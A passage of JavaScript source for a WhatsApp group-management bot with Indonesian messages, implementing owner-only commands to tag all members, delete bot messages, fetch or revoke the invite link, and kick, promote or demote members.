let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
}
break
case 'del':
case 'delete':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
conn.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
break
case 'linkgrup': case 'linkgc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)
break
case 'kick':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
conn.groupParticipantsUpdate(from, [number], "remove")
mentions(`Sukses kick member @${number.split('@')[0]}`, [number])
} else if (isQuotedMsg) {
number = quotedMsg.sender
conn.groupParticipantsUpdate(from, [number], "remove")
mentions(`Sukses kick member @${number.split('@')[0]}`, [number])
} else {
reply('Tag atau reply orang yg mau dikick\n\n*Contoh:* #kick @tag')
}
break
case 'revoke':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
await conn.groupRevokeInvite(from)
.then( res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break
case 'tagall':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Teks?`)
let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n\n`
for (let mem of participants) {
teks_tagall += `➲ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: msg })
}
break
case 'promote':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${prefix+command} @tag`)
}
}
break
case 'demote':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix+command} @tag`)
}
}
break

// BATAS NYA COY

default:
}} catch (err) {
console.log(color('[ERROR]', 'red'), err)
conn.sendMessage(setting.ownerNumber, {text:`${err}`})
}}